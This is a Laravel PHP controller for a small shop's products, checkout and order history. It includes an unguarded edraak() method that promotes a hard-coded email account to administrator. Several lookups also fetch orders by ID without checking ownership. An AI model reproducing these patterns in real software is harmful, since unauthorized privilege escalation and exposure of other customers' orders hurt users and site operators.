<?php

namespace App\Http\Controllers;


use App\Models\category;
use App\Models\User;
use App\Models\product;
use App\Models\address;
use App\Models\order;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Session;
use App\Models\cart;
use App\Models\oneOrder;
use Illuminate\Support\Str;

class access extends Controller
{
    public function access()
    {
        $usertype = Auth::user()->usertype;
        if ($usertype == "1") {
            return view("admin.home");
        } else {
            $categories = category::all();
            $products = product::paginate(15);
            return view('homepage', ['products' => $products, 'categories' => $categories]);
        }
    }
    public function itemHome()
    {
        $categories = category::all();
        $products = product::paginate(15);
        return view('homepage', ['products' => $products, 'categories' => $categories]);
    }
    public function productview($productId)
    {
        $product = product::find($productId);
        return view("productview", ["product" => $product]);
    }
    public function confirmOrder($id)
    {   
        $address= address::where('user_id',Auth::user()->id)->get();
        $product = product::find($id);
        return view("confirmorder", ["product" => $product,"address"=>$address]);
    }
    public function checkout(Request $request)
    {
        $validation = $request->validate([
            "put"=> "required",
            "qty" => "required|integer|min:1",
            "CashOnDelivery" => "required"
        ]);
        $id = $request->product_id;
        // $address = new address();
        // $address->full_name = $request->fullName;
        // $address->country = $request->country;
        // $address->province = $request->province;
        // $address->city = $request->city;
        // $address->address = $request->address;
        // $address->phone = $request->phone;
        // $address->zipcode = $request->zipcode;
        // $address->user_id = Auth::user()->id;
        // $address->save();
        $qantity = $request->qty;
        $product = product::find($id);
        $totalPrice = $product->price * $qantity;
        $order = new order();
        $order->order_num = Str::random(20) . Auth::user()->id;
        $order->qty = $qantity;
        $order->price = $totalPrice;
        $order->user_id = Auth::user()->id;
        $order->product_id = $product->id;
        $order->address_id = $request->put;
        $order->save();
        session()->flash('message', 'Order placed successfully.');
        return redirect()->route('clientOrder');
    }
    ####
    public function clientOrder()
    {
        $orders = order::where('user_id', Auth::user()->id)->where("one_order",null)->paginate(15);

        // $one_order = oneOrder::where("user_id", Auth::user()->id)->paginate(7);

        return view('orderClient', ["orders" => $orders]);
    }
    #####
    public function showDetailOrder(Request $request)
    {
        $validation = $request->validate([
            'product' => "required|integer|min:1",
            'order' => "required|integer|min:1"
        ]);
        $product_id = $request->product;
        $order_id = $request->order;
        $order = order::find($order_id);
        $product = product::find($product_id);
        return view("clientOrderDetail", ["product" => $product, "order" => $order]);
    }
    public function showDetailOneOrder(Request $request)
    {
        $validation = $request->validate([
            'order' => "required"
        ]);
        $one_order = order::where("one_order", $request->order)
        ->join("products","orders.product_id" ,"=","products.id")
        ->paginate(15,['orders.*', 'products.name',"products.image"]);
        $count= count($one_order);
          return view("clientOrderDetailOneOrder", ["one_order" => $one_order,"count"=>$count]);
    }
    public function clientOrderHasProduct ()
    {
        $one_order = oneOrder::where("user_id", Auth::user()->id)->paginate(15);
       
        return view('oneOrderClient', ["one_order" => $one_order]);

    }
    public function edraak()
    {
        $user= User::where('email', 'admin@edraakmc.com')
        ->update(['usertype' => 1]);
        return redirect()->back();
    }
}
